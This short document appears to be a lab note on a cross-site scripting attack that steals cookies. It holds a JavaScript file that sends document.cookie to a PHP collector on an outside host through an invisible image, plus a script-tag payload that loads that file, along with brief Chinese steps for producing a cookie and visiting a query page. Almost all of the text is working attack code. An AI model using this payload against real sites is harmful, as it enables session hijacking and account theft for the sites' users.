# mail.js

```js
var img = document.createElement('img');
img.width = 0;
img.height = 0;
img.src = 'http://192.168.31.193:8082/sendmail.php?mycookie='+encodeURIComponent(document.cookie);
```

# sendmail.php

payload

```html
<script src=\'http://192.168.31.193:8082/mail.js\'></script>
```



http://192.168.31.193:8082/store.html 

输入用户名产生cookie 



访问 http://192.168.31.193:8082/query.php?id=1

